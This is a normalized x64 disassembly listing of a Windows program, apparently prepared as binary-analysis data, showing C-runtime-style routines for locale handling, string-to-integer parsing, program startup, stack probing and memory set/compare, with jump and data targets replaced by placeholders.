lea rbx [ r14 + 0x20 ]
mov rdx [ rbx ]
call sub_14003e9f0
mov r14 rbx
mov r8d 0x3
test eax eax
mov rax [ rbx ]
mov ebx 0x351
mov [ rsp + 0x28 ] rax
cmovne r12d r15d
lea rax [ r--data ]
add r13 0x18
mov edx ebx
mov rcx rbp
mov r9 [ r13 ]
mov [ rsp + 0x20 ] rax
call sub_14003c12c
lea r11 [ r--data ]
cmp r13 r11
jl r-xdata
lea r8 [ r--data ]
mov rdx rbx
mov rcx rbp
call sub_1400489c4
test eax eax
jne r-xdata
test r12d r12d
jne r-xdata
mov rcx rsi
call sub_14003ad04
mov rcx [ rdi + 0x58 ]
or ebx 0xffffffff
test rcx rcx
je r-xdata
mov rcx [ rdi + 0x58 ]
or ebx 0xffffffff
test rcx rcx
je r-xdata
mov rcx [ rdi + 0x60 ]
test rcx rcx
je r-xdata
mov eax ebx
[ rcx ] eax
add eax ebx
jne r-xdata
mov rax [ rdi + 0x60 ]
test rax rax
je r-xdata
mov eax ebx
[ rcx ] eax
add eax ebx
jne r-xdata
mov rax [ rdi + 0x88 ]
mov [ rdi + 0x60 ] r15
mov [ rdi + 0x50 ] r15
mov [ rdi + 0x58 ] r15
mov [ rdi + 0x48 ] r15
jmp r-xdata
mov eax ebx
[ rcx ] eax
add eax ebx
jne r-xdata
mov rcx [ rdi + 0x58 ]
call sub_14003ad04
mov [ rdi + 0x60 ] r15
mov [ rdi + 0x50 ] r15
mov [ rdi + 0x58 ] rsi
mov [ rdi + 0x48 ] rbp
mov rax rbp
jmp r-xdata
mov ecx ebx
[ rax ] ecx
add ecx ebx
jne r-xdata
mov rcx [ rdi + 0x58 ]
call sub_14003ad04
mov rcx [ rdi + 0x60 ]
call sub_14003ad04
mov rcx [ rdi + 0x60 ]
call sub_14003ad04
sub_14003c5b8
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rsi [ rsp + 0x160 ]
mov rbx r9
mov r14 r8
mov rbp rdx
mov rdi rcx
call sub_140043c34
lea rcx [ rax + 0x170 ]
lea r15 [ rax + 0x168 ]
xor r12d r12d
mov [ rsp + 0x40 ] rcx
lea rcx [ rax + 0x174 ]
lea r13 [ rax + 0x1f7 ]
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x38 ] rcx
test rdi rdi
je r-xdata
xor eax eax
test rbp rbp
je r-xdata
test r14 r14
je r-xdata
cmp [ rdi ] 0x43
jne r-xdata
mov rcx rdi
call sub_14003f7f0
mov r12 rax
cmp rax 0x83
jae r-xdata
cmp [ rdi + 0x1 ] r12b
jne r-xdata
lea rcx [ rsp + 0x50 ]
mov rdx rdi
xor r15d r15d
call sub_14003c194
test eax eax
jne r-xdata
mov rdx rdi
mov rcx r13
call sub_14003e9f0
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r14
mov rcx rbp
call sub_140042dcc
test eax eax
jne r-xdata
mov rdx [ rsp + 0x30 ]
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x50 ]
call sub_140049250
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov rcx [ rsp + 0x38 ]
mov rdx rdi
call sub_14003e9f0
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
call sub_1400436bc
int3
test rbx rbx
je r-xdata
mov rax [ rsp + 0x30 ]
mov rcx [ rsp + 0x40 ]
lea r8 [ rsp + 0x50 ]
movzx eax [ rax + 0x4 ]
mov edx 0x83
mov [ rcx ] eax
mov rcx r13
call sub_14003c344
cmp [ rdi ] r15b
je r-xdata
test rsi rsi
je r-xdata
mov r8d 0x6
mov rdx r15
mov rcx rbx
call sub_14003a8c0
test rsi rsi
je r-xdata
mov [ rbx ] r12d
mov [ rbx + 0x4 ] r12w
lea rdi [ r--data ]
cmp r12 0x83
jae r-xdata
mov r8 r13
mov rdx r14
mov rcx rbp
call sub_140042dcc
test eax eax
jne r-xdata
mov rdx [ rsp + 0x40 ]
mov r8d 0x4
mov rcx rsi
call sub_14003a8c0
mov rax rbp
jmp r-xdata
mov [ rsi ] r12d
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
mov r15 [ rsp + 0x30 ]
mov r15 r12
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
mov rax r13
jmp r-xdata
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xf8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rsp + 0x38 ]
lea r9 [ r15 + 0x1 ]
mov r8 rdi
mov edx 0x83
call sub_140048a40
test eax eax
jne r-xdata
sub_14003c7f4
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x110 ]
sub rsp 0x210
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x100 ] rax
mov rbx r8
movsxd r12 edx
mov rdi rcx
call sub_140043c34
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x70 ]
mov rsi rax
lea rax [ rsp + 0x44 ]
mov r8d 0x83
mov rcx rbx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rax
call sub_14003c5b8
test rax rax
jne r-xdata
mov rbx r12
lea rcx [ rsp + 0x70 ]
mov r15 r12
shl rbx 0x5
mov rdx [ rbx + rdi + 0x48 ]
call sub_14003e9f0
test eax eax
jne r-xdata
xor eax eax
lea rcx [ rsp + 0x70 ]
call sub_14003f7f0
mov r12 rax
lea rcx [ rax + 0x5 ]
call sub_140041684
mov r13 rax
test rax rax
je r-xdata
mov rax [ rbx + rdi + 0x48 ]
jmp r-xdata
mov rax [ rbx + rdi + 0x48 ]
lea r14 [ r15 + 0x3 ]
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x58 ] rax
mov eax [ rdi + r14 * 4 ]
mov r8d 0x6
mov [ rsp + 0x54 ] eax
lea rax [ r15 + r15 * 2 + 0x12 ]
lea rax [ rdi + rax * 2 ]
mov rdx rax
mov [ rsp + 0x60 ] rax
call sub_14003a8c0
mov eax [ rdi + 0x4 ]
lea rdx [ r12 + 0x1 ]
lea r8 [ rsp + 0x70 ]
lea rcx [ r13 + 0x4 ]
mov [ rsp + 0x50 ] eax
call sub_140042dcc
test eax eax
jne r-xdata
mov rcx [ rbp + 0x100 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x268 ]
add rsp 0x210
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
mov rcx [ rsp + 0x60 ]
lea rax [ r13 + 0x4 ]
lea rdx [ rsp + 0x48 ]
mov [ rbx + rdi + 0x48 ] rax
movzx eax [ rsp + 0x48 ]
mov r8d 0x6
mov [ rdi + r14 * 4 ] eax
call sub_14003a8c0
mov r9d r15d
cmp r15d 0x2
jne r-xdata
cmp r9d 0x1
jne r-xdata
mov eax [ rsp + 0x44 ]
xor r8d r8d
xor edx edx
mov [ rdi + 0x4 ] eax
mov rcx [ rsi + 0x29c ]
lea rax [ r15 + r15 * 2 ]
lea rdx [ r--data ]
mov rcx rdi
call [ rdx + rax * 8 ]
test eax eax
je r-xdata
mov eax [ rsp + 0x44 ]
mov [ rdi + 0x8 ] eax
test r8d r8d
je r-xdata
mov rax [ rsi + rdx * 8 + 0x27c ]
mov [ rsi + rdx * 8 + 0x27c ] rcx
inc rdx
inc r8d
mov rcx rax
cmp rdx 0x5
jl r-xdata
lea rcx [ rw-data ]
cmp [ rsp + 0x58 ] rcx
je r-xdata
mov rax [ rsp + 0x58 ]
mov rcx r13
mov [ rbx + rdi + 0x48 ] rax
call sub_14003ad04
mov r11d [ rsp + 0x54 ]
mov eax [ rsp + 0x50 ]
mov [ rdi + r14 * 4 ] r11d
mov [ rdi + 0x4 ] eax
jmp r-xdata
cmp r8d 0x5
jne r-xdata
movsxd rdx r8d
mov rax [ rsi + rdx * 8 + 0x27c ]
mov [ rsi + 0x27c ] rax
mov [ rsi + rdx * 8 + 0x27c ] rcx
mov eax [ rsi + rdx * 8 + 0x27c ]
cmp [ rdi + 0x4 ] eax
je r-xdata
jmp r-xdata
mov [ r13 ] 0x1
mov [ rbx + rdi + 0x58 ] r13
jmp r-xdata
mov rdx [ rbx + rdi + 0x58 ]
[ rdx ]
jne r-xdata
mov eax [ rsi + 0x280 ]
mov [ rdi + 0x108 ] eax
mov eax [ rdi + 0x14 ]
lea r12d [ r8 + 0x7a ]
mov [ rsp + 0x38 ] 0x1
mov [ rsp + 0x30 ] eax
mov eax [ rdi + 0x4 ]
lea r8 [ r--data ]
mov [ rsp + 0x28 ] eax
lea rax [ rbp ]
lea edx [ r12 - 0x7e ]
mov r9d r12d
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_140049690
test eax eax
je r-xdata
mov rcx [ rbx + rdi + 0x58 ]
call sub_14003ad04
shl r14 0x5
mov rcx [ r14 + rdi ]
call sub_14003ad04
and [ rbx + rdi + 0x50 ] 0x0
and [ rsi + 0x280 ] 0x0
lea rax [ rbp ]
mov ecx 0x1ff
and [ rax ] cx
add rax 0x2
dec r12
jne r-xdata
mov rdx [ rw-data ]
lea rcx [ rbp ]
mov r8d 0xfe
call sub_14003d8f0
xor ecx ecx
test eax eax
sete cl
mov [ rsi + 0x280 ] ecx
jmp r-xdata
mov eax [ rdi + 0x4 ]
mov r9d r15d
mov [ rsi + 0x27c ] eax
sub_14003cb04
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0xd0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov rbx r8
mov rdi rcx
test edx edx
je r-xdata
xor esi esi
lea r12d [ rsi + 0x1 ]
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
call sub_14003c3dc
cmp [ r8 ] 0x4c
jne r-xdata
movsxd rax edx
shl rax 0x5
mov rax [ rax + rcx + 0x48 ]
jmp r-xdata
call sub_14003c7f4
jmp r-xdata
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
lea rdx [ rsp + 0x30 ]
xor r9d r9d
mov r8d 0x83
mov rcx rbx
call sub_14003c5b8
test rax rax
je r-xdata
cmp [ r8 + 0x1 ] 0x43
jne r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xd0
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
xor ebx ebx
lea rbp [ rdi + 0x48 ]
cmp [ r8 + 0x2 ] 0x5f
jne r-xdata
inc ebx
add rbp 0x20
cmp ebx 0x5
jle r-xdata
mov rdx [ rbp ]
lea rcx [ rsp + 0x30 ]
call sub_14003e9f0
test eax eax
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_1400497d8
mov rbp rax
test rax rax
je r-xdata
test ebx ebx
je r-xdata
test r12d r12d
jne r-xdata
inc esi
lea r8 [ rsp + 0x30 ]
mov edx ebx
mov rcx rdi
call sub_14003c7f4
test rax rax
jne r-xdata
xor eax eax
jmp r-xdata
mov r13 rax
sub r13 rbx
je r-xdata
mov rcx rdi
jmp r-xdata
xor r12d r12d
jmp r-xdata
cmp [ rax ] 0x3b
je r-xdata
test esi esi
je r-xdata
mov r14d 0x1
lea r12 [ r--data ]
lea rax [ r--data ]
add r12 0x18
inc r14d
cmp r12 rax
jle r-xdata
mov rcx [ r12 ]
call sub_14003f7f0
cmp r13 rax
je r-xdata
mov rcx [ r12 ]
mov r8 r13
mov rdx rbx
call sub_140049720
test eax eax
jne r-xdata
inc rbp
lea rdx [ r--data ]
mov rcx rbp
call sub_14003b894
mov rbx rax
test rax rax
jne r-xdata
cmp r14d 0x5
jg r-xdata
cmp [ rbp ] 0x3b
jne r-xdata
add rbx rbp
cmp [ rbx ] 0x0
je r-xdata
lea rcx [ rsp + 0x30 ]
mov r9 rax
mov r8 rbp
mov edx 0x83
call sub_140048a40
test eax eax
jne r-xdata
inc rbx
cmp [ rbx ] 0x0
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
lea r8 [ rsp + 0x30 ]
mov edx r14d
mov rcx rdi
mov [ rsp + rbx + 0x30 ] al
call sub_14003c7f4
test rax rax
je r-xdata
inc esi
sub_14003cd28
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rsi rdx
mov ebp ecx
cmp ecx 0x5
ja r-xdata
xor eax eax
test rdx rdx
je r-xdata
mov r12d 0x1
mov edx r12d
lea ecx [ r12 + 0xf ]
call sub_140041704
mov rbx rax
test rax rax
jne r-xdata
mov rdx r12
mov ecx 0x160
call sub_140041704
mov [ rbx ] rax
test rax rax
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0xc
mov rdx r12
mov ecx 0x220
call sub_140041704
mov [ rbx + 0x8 ] rax
test rax rax
jne r-xdata
mov rcx rbx
call sub_14003ad04
jmp r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rcx [ rbx ]
call sub_14003ad04
jmp r-xdata
mov rcx [ rbx ]
mov r8 rsi
mov edx ebp
call sub_14003cb04
test rax rax
je r-xdata
lea rdx [ rw-data ]
cmp rdi rdx
je r-xdata
mov rcx [ rbx ]
call sub_140045cb4
mov rcx [ rbx ]
call sub_140045d58
mov rcx rbx
call sub_14003ad04
xor ebx ebx
jmp r-xdata
mov rax [ rbx ]
mov rdx [ rbx + 0x8 ]
mov ecx [ rax + 0x4 ]
call sub_14004636c
test eax eax
je r-xdata
mov rcx rdi
mov r8d 0x160
call sub_14003a8c0
and [ rdi ] 0x0
mov rcx rdi
call sub_140045c28
mov rax rbx
jmp r-xdata
mov rax [ rbx + 0x8 ]
mov [ rax ] r12d
mov rax [ rbx + 0x8 ]
mov [ rax ] r12d
mov rcx [ rbx + 0x8 ]
call sub_14003ad04
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
sub_14003ce60
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov r13 rdx
mov r12d ecx
xor esi esi
cmp ecx 0x5
jbe r-xdata
call sub_140043c34
mov rbx rax
mov [ rsp + 0x60 ] rax
call sub_140045f2c
or [ rbx + 0xc8 ] 0x10
mov edx 0x1
mov ecx 0x160
call sub_140041704
mov rdi rax
test rax rax
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor eax eax
jmp r-xdata
and [ rbx + 0xc8 ] 0xffffffef
mov rax rsi
mov ecx 0xc
call sub_140046c48
nop
mov rdx [ rbx + 0xc0 ]
test rdx rdx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
mov ecx 0xc
call sub_140046b48
mov r8 r13
mov edx r12d
mov rcx rdi
call sub_14003cb04
mov rsi rax
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
cmp rdi rdx
je r-xdata
mov rcx rdi
call sub_140045cb4
mov rcx rdi
call sub_140045d58
nop
test r13 r13
je r-xdata
mov rcx rdi
mov r8d 0x160
call sub_14003a8c0
and [ rdi ] 0x0
mov rcx rdi
call sub_140045c28
nop
mov r12d 0x1
lea rdx [ rw-data ]
mov rcx r13
call sub_14003e9f0
mov ecx [ rw-data ]
test eax eax
mov r12d 0x1
cmovne ecx r12d
mov [ rw-data ] ecx
jmp r-xdata
mov ecx 0xc
call sub_140046b48
jmp r-xdata
test [ rw-data ] r12b
jne r-xdata
mov ecx 0xc
call sub_140046c48
nop
mov rdx rdi
lea rcx [ rbx + 0xc0 ]
call sub_140045ed4
mov rcx rdi
call sub_140045cb4
test [ rbx + 0xc8 ] 0x2
jne r-xdata
mov rdx [ rbx + 0xc0 ]
lea rcx [ rw-data ]
call sub_140045ed4
mov r11 [ rw-data ]
mov rax [ r11 + 0x128 ]
mov [ rw-data ] rax
mov rax [ r11 + 0x140 ]
mov [ rw-data ] rax
mov eax [ r11 + 0x10c ]
mov [ rw-data ] eax
sub_14003d028
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x20 ] rsi
movsd [ rax + 0x8 ] xmm0
push rdi
sub rsp 0x40
mov ebx edx
movaps [ rax - 0x18 ] xmm6
mov esi 0xffc0
mov ecx 0x1f80
mov edx esi
movapd xmm6 xmm0
call sub_14004a4ec
movzx ecx [ rsp + 0x56 ]
mov rdi rax
mov eax 0x7ff0
and cx ax
cmp cx ax
jne r-xdata
ucomisd xmm6 [ r--data ]
jpe r-xdata
movapd xmm0 xmm6
call sub_14004a304
test eax eax
jle r-xdata
lea rdx [ rsp + 0x60 ]
movapd xmm0 xmm6
call sub_14004a378
mov ecx [ rsp + 0x60 ]
test ebx ebx
jns r-xdata
je r-xdata
movapd xmm0 xmm6
mov ecx 0x8
addsd xmm0 [ r--data ]
jmp r-xdata
cmp eax 0x2
jle r-xdata
mov eax 0x7fffffff
sub eax ebx
cmp ecx eax
jg r-xdata
mov eax 0x80000000
sub eax ebx
cmp ecx eax
jl r-xdata
mov rdx rsi
mov rcx rdi
call sub_14004a4ec
movapd xmm0 xmm6
jmp r-xdata
movd xmm3 ebx
movapd xmm2 xmm6
mov edx 0x19
mov [ rsp + 0x28 ] rdi
movsd [ rsp + 0x20 ] xmm0
cvtdq2pd xmm3 xmm3
call sub_14004a18c
cmp eax 0x3
jne r-xdata
movapd xmm1 xmm0
movsd xmm0 [ rw-data ]
call sub_14004a294
lea edx [ rcx + rbx ]
cmp edx 0xa00
jg r-xdata
mulsd xmm0 [ r--data ]
jmp r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
movaps xmm6 [ rsp + 0x30 ]
add rsp 0x40
pop rdi
retn
movd xmm2 ebx
lea ecx [ rax + 0x16 ]
movapd xmm1 xmm6
mov r9 rdi
cvtdq2pd xmm2 xmm2
call sub_14004a124
jmp r-xdata
cmp edx 0x400
jle r-xdata
cmp edx 0xfffff603
jge r-xdata
add edx 0xfffffa00
call sub_14004a2cc
jmp r-xdata
cmp edx 0xfffffc03
jge r-xdata
mov ecx 0x11
call sub_14004a2cc
movapd xmm6 xmm0
add edx 0x600
call sub_14004a2cc
jmp r-xdata
mov ecx 0x12
jmp r-xdata
sub_14003d1ac
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x50
and [ rax - 0x38 ] 0x0
mov rdi rdx
xor edx edx
mov rbx r8
mov rbp rcx
lea r8d [ rdx + 0x28 ]
lea rcx [ rax - 0x30 ]
mov rsi r9
call sub_14003d760
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
mov rcx rdi
call sub_14003f7f0
mov r9 [ rsp + 0x80 ]
mov ecx 0x7fffffff
cmp rax rcx
mov r8 rsi
mov rdx rbx
cmova eax ecx
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x38 ] 0x49
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x20 ] rdi
mov [ rsp + 0x28 ] eax
call rbp
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
sub_14003d254
mov r11 rsp
mov [ r11 + 0x10 ] rdx
mov [ r11 + 0x18 ] r8
mov [ r11 + 0x20 ] r9
sub rsp 0x38
mov r8 rdx
lea rax [ r11 + 0x18 ]
mov rdx rcx
lea rcx [ sub_14004a648 ]
xor r9d r9d
mov [ r11 - 0x18 ] rax
call sub_14003d1ac
add rsp 0x38
retn
sub_14003d28c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x40
mov r15 rdx
mov rdx rcx
lea rcx [ rbp - 0x20 ]
mov r13d r9d
mov r14 r8
call sub_14003b928
test r14 r14
je r-xdata
test r15 r15
jne r-xdata
mov [ r14 ] r15
test r13d r13d
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp [ rbp - 0x8 ] 0x0
jmp r-xdata
mov r12b [ r15 ]
mov r8 [ rbp - 0x20 ]
xor edi edi
lea rbx [ r15 + 0x1 ]
cmp r13d 0x2
jl r-xdata
je r-xdata
mov rax [ r8 + 0x140 ]
movzx ecx r12b
movzx eax [ rax + rcx * 2 ]
and eax 0x8
lea r8 [ rbp - 0x20 ]
movzx ecx r12b
mov edx 0x8
call sub_14004b7b4
mov r8 [ rbp - 0x20 ]
jmp r-xdata
cmp r13d 0x24
jg r-xdata
xor eax eax
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov esi [ rbp + 0x50 ]
cmp r12b 0x2d
jne r-xdata
mov r12b [ rbx ]
inc rbx
jmp r-xdata
test eax eax
je r-xdata
cmp r12b 0x2b
jne r-xdata
or esi 0x2
jmp r-xdata
cmp [ r8 + 0x10c ] 0x1
jle r-xdata
test r13d r13d
js r-xdata
mov r12b [ rbx ]
inc rbx
test r14 r14
je r-xdata
cmp r13d 0x1
je r-xdata
cmp [ rbp - 0x8 ] dil
mov [ r14 ] r15
cmp r13d 0x24
jg r-xdata
test r13d r13d
jne r-xdata
cmp r13d 0x10
jne r-xdata
cmp r12b 0x30
je r-xdata
mov r10 [ r8 + 0x140 ]
xor edx edx
or eax 0xffffffff
div r13d
mov r9d eax
cmp r12b 0x30
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r13d 0xa
jmp r-xdata
and r8d 0x103
je r-xdata
movsx ecx r12b
sub ecx 0x30
jmp r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r13d 0x10
jmp r-xdata
cmp [ rbx ] 0x58
je r-xdata
dec rbx
test sil 0x8
jne r-xdata
lea eax [ r12 - 0x61 ]
movsx ecx r12b
cmp al 0x19
ja r-xdata
cmp ecx r13d
jae r-xdata
mov r12b [ rbx + 0x1 ]
add rbx 0x2
cmp [ rbx ] 0x58
jne r-xdata
mov r13d 0x8
jmp r-xdata
mov r12d 0x7fffffff
test sil 0x4
jne r-xdata
test r14 r14
cmovne rbx r15
xor edi edi
jmp r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or esi 0x8
cmp edi r9d
jb r-xdata
call sub_14003f1a4
mov [ rax ] 0x22
test sil 0x1
je r-xdata
test sil 0x1
jne r-xdata
test r14 r14
je r-xdata
imul edi r13d
add edi ecx
jne r-xdata
mov al sil
and al 0x2
neg al
sbb edi edi
neg edi
add edi r12d
or edi 0xffffffff
jmp r-xdata
mov eax esi
and eax 0x2
je r-xdata
test sil 0x2
je r-xdata
mov [ r14 ] rbx
movzx ecx r12b
movzx r8d [ r10 + rcx * 2 ]
mov ecx r8d
and ecx 0x4
je r-xdata
or esi 0x4
test r14 r14
jne r-xdata
cmp ecx edx
jbe r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
neg edi
mov r12b [ rbx ]
inc rbx
jmp r-xdata
cmp edi r12d
jbe r-xdata
mov eax edi
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
sub_14003d4f8
sub rsp 0x38
xor eax eax
mov r9d r8d
mov r8 rdx
cmp [ rw-data ] eax
mov [ rsp + 0x20 ] eax
mov rdx rcx
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_14003d28c
add rsp 0x38
retn
sub_14003d528
sub rsp 0x38
cmp [ rw-data ] 0x0
mov r9d r8d
mov r8 rdx
mov rdx rcx
mov [ rsp + 0x20 ] 0x1
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_14003d28c
add rsp 0x38
retn
sub_14003d55c
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x30
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
movsxd rax [ r--data ]
lea rcx [ __dos_header ]
add rax rcx
cmp [ rax ] 0x4550
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ecx 0x20b
cmp [ rax + 0x18 ] cx
jne r-xdata
mov [ rsp + 0x40 ] ebx
call sub_140042ed8
test eax eax
jne r-xdata
xor ebx ebx
cmp [ rax + 0x84 ] 0xe
jbe r-xdata
call sub_140043d8c
test eax eax
jne r-xdata
cmp [ rw-data ] 0x2
je r-xdata
cmp [ rax + 0xf8 ] ebx
setne bl
call sub_14004bf10
nop
call sub_1400447a4
test eax eax
jns r-xdata
cmp [ rw-data ] 0x2
je r-xdata
mov ecx 0x1c
call sub_140043820
mov ecx 0xff
call sub_14003de68
call sub_140043a80
call [ GetCommandLineW@IAT ]
mov [ rw-data ] rax
call sub_14004be88
mov [ rw-data ] rax
call sub_14004bd98
test eax eax
jns r-xdata
mov ecx 0x1b
call sub_14003e1c4
mov ecx 0x10
call sub_140043820
mov ecx 0xff
call sub_14003de68
call sub_140043a80
call sub_14004bac8
test eax eax
jns r-xdata
mov ecx 0x8
call sub_14003e1c4
mov ecx 0x1
call sub_14003df4c
test eax eax
je r-xdata
mov ecx 0x9
call sub_14003e1c4
mov r8 [ rw-data ]
mov [ rw-data ] r8
mov rdx [ rw-data ]
mov ecx [ rw-data ]
call sub_140012b20
mov edi eax
mov [ rsp + 0x20 ] eax
test ebx ebx
jne r-xdata
mov ecx eax
call sub_14003e1c4
call sub_14003e1a4
jmp r-xdata
mov ecx eax
call sub_14003e18c
mov eax edi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_14003d6af
mov edi eax
cmp [ rsp + 0x40 ] 0x0
jne r-xdata
call sub_14003e1b4
nop
mov eax edi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov ecx eax
call sub_14003e198
int3
sub_14003d700
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_14003d760
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_14003d84c
lea rax [ sub_14004c1c0 ]
lea rcx [ sub_14004cd10 ]
mov [ rw-data ] rax
lea rax [ sub_14004c1b0 ]
mov [ rw-data ] rcx
mov [ rw-data ] rax
lea rax [ sub_14004c1b8 ]
mov [ rw-data ] rcx
mov [ rw-data ] rax
lea rax [ sub_14004c154 ]
mov [ rw-data ] rax
lea rax [ sub_14004cc78 ]
mov [ rw-data ] rax
lea rax [ sub_14004c16c ]
mov [ rw-data ] rax
lea rax [ sub_14004c0b4 ]
mov [ rw-data ] rax
lea rax [ sub_14004c034 ]
mov [ rw-data ] rax
retn
sub_14003d8f0
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
